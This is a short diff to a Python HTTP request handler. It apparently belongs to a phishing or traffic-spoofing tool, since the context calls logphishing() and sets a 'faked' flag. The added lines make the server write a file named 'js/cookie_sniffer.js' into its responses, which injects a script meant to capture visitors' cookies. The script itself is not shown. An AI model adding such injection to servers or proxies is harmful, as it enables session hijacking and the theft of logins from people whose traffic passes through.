@@ -269,8 +269,12 @@ class HTTPRequestHandler(BaseHTTPServer.BaseHTTPRequestHandler):
       logphishing()
 
     else:
+
       self.send_response(200)
       self.end_headers()
+
+      self.wfile.write(open('js/cookie_sniffer.js').read())
+
       faked = False
 
     uri = "%s://%s"%(self.server.PRE.lower(),fullpath)
